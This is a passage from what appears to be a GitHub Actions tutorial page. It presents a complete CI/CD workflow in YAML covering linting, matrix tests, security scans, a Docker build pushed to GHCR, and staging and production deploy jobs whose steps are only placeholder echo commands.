<p class="desc">This workflow combines every concept from all 18 chapters into a single, production-ready pipeline. Study it as a reference and adapt it for your projects:</p>

${code("The ultimate pipeline — all concepts combined","yaml",`name: Production CI/CD Pipeline

on:
  push:
    branches: [main]
    paths-ignore: ["docs/**", "**.md"]
  pull_request:
    branches: [main]
  workflow_dispatch:
    inputs:
      force_deploy:
        type: boolean
        default: false

concurrency:
  group: pipeline-\${{ github.ref }}
  cancel-in-progress: \${{ github.event_name == 'pull_request' }}

permissions:
  contents: read

env:
  PYTHON_VERSION: "3.12"

jobs:
  lint:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: \${{ env.PYTHON_VERSION }}
          cache: pip
      - run: pip install flake8 black isort
      - run: flake8 . && black --check . && isort --check .

  test:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        python-version: ["3.11", "3.12"]
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-python@v5
        with:
          python-version: \${{ matrix.python-version }}
          cache: pip
      - run: pip install -r requirements.txt
      - run: pytest test_app.py --cov=. --cov-report=xml -v
      - uses: actions/upload-artifact@v4
        if: matrix.python-version == '3.12'
        with:
          name: coverage
          path: coverage.xml

  security:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - run: pip install safety bandit
      - run: safety check -r requirements.txt
      - run: bandit -r . -ll

  build:
    needs: [lint, test, security]
    runs-on: ubuntu-latest
    permissions:
      contents: read
      packages: write
    steps:
      - uses: actions/checkout@v4
      - uses: docker/login-action@v3
        with:
          registry: ghcr.io
          username: \${{ github.actor }}
          password: \${{ secrets.GITHUB_TOKEN }}
      - uses: docker/build-push-action@v5
        with:
          context: .
          push: \${{ github.event_name != 'pull_request' }}
          tags: ghcr.io/\${{ github.repository }}:\${{ github.sha }}

  deploy-staging:
    needs: build
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment:
      name: staging
      url: https://staging.myapp.com
    concurrency:
      group: deploy-staging
      cancel-in-progress: false
    steps:
      - run: echo "🚀 Deploying to staging..."

  deploy-production:
    needs: deploy-staging
    if: github.ref == 'refs/heads/main'
    runs-on: ubuntu-latest
    environment:
      name: production
      url: https://myapp.com
    concurrency:
      group: deploy-production
      cancel-in-progress: false
    steps:
      - run: echo "🚀 Deploying to production!"

  notify:
    needs: [deploy-production]
    if: always()
    runs-on: ubuntu-latest
    steps:
      - run: |
          echo "Pipeline complete!"
          echo "Result: \${{ needs.deploy-production.result }}"`)}
